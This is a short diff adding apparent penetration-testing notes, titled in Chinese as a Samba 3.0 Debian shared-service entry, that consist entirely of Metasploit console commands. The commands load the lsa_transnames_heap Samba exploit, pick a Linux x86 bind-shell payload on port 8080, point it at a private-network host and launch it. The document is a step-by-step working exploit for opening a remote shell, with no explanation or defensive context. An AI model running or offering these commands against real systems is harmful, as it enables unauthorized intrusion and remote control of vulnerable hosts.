@@ -1,0 +1,10 @@
+samba3.0 debian共享服务版本
+
+
+search samba
+use linux/samba/lsa_transnames_heap
+show payloads
+set payload linux/x86/shell_bind_tcp
+set LPORT 8080
+set RHOST 192.168.2.128
+exploit
